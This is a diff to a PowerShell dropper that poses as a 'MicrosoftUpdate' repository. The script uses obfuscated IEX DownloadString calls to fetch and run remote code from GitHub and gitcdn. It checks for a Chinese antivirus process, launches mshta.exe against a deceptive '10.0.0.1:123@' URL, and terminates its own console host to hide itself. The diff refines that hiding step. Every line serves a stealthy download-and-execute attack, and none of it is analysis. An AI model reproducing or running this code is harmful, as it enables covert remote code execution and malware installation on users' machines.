@@ -1,18 +1,33 @@
 IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/Update_181115/master/Download')
-			
+$id = $null			
 $id = Get-Process -name ZhuDongFangYu* | Select-Object id | ForEach-Object -Process{$_.id}
 			
 if($id -eq $null) {
 			
-C:\Windows\SysWOW64\mshta.exe https://10.0.0.1:123@min.gitcdn.link/repo/MicrosoftUpdate/Update_181115/master/Patchx86
+	C:\Windows\SysWOW64\mshta.exe https://10.0.0.1:123@min.gitcdn.link/repo/MicrosoftUpdate/Update_181115/master/Patchx86
+	$instance = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
+	$cmdid = $instance.ParentProcessId
+	$killid = $null
+	$conhosts = (Get-WmiObject win32_process | where {$_.ProcessName -eq 'conhost.exe'} | select ProcessId)
 
-Get-WmiObject Win32_Process -Filter "name = 'conhost.exe'" | ForEach-Object{$_.Terminate()  | Out-Null }
+	foreach ($conhost in $conhosts){
+		$procid = $conhost.ProcessId
+		$conhost = Get-CimInstance Win32_Process | where {$_.ProcessId -eq $procid}
+		
+		if ($conhost.ParentProcessId -eq $cmdid){
+			$killid = $conhost.ProcessId
+		}
+	}
+
+	if($killid -ne $null){
+		Get-WmiObject Win32_Process -Filter "ProcessId = '$killid'" | ForEach-Object{$_.Terminate()  | Out-Null }
+	}
 
 }
 			
 else{
 			
-IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/Update_181115/master/GetSession')
+	IEX (New-Object System.Net.Webclient)."Downloa`dString"('ht'+'tps://raw.githubusercontent.com/MicrosoftUpdate/Update_181115/master/GetSession')
 	
 }
 
